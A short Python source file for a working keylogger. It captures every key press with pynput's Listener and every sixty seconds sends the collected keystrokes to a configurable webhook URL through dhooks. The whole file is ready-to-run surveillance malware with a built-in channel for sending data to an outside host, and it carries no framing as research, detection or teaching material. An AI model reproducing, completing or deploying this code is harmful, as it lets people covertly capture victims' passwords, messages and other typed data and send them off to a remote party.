from dhooks import Webhook
from threading import Timer
from pynput.keyboard import Listener

WEBHOOK_URL = 'your-custom-webhook-url'
TIME_INTERVAL = 60  # Amount of time between each report, expressed in seconds.

class Keylogger:
    def __init__(self, webhook_url, interval):
        self.interval = interval
        self.webhook = Webhook(webhook_url)
        self.log = ""

    def _report(self):
        """Send the logged keys to the webhook."""
        if self.log != '':
            try:
                self.webhook.send(self.log)
            except Exception as e:
                print(f"Failed to send data: {e}")
            self.log = ''
        Timer(self.interval, self._report).start()

    def _on_key_press(self, key):
        """Log the pressed keys."""
        key_str = str(key).replace("'", "")
        self.log += key_str

    def run(self):
        """Start the keylogger."""
        self._report()
        with Listener(on_press=self._on_key_press) as t:
            t.join()

if __name__ == '__main__':
    Keylogger(WEBHOOK_URL, TIME_INTERVAL).run()
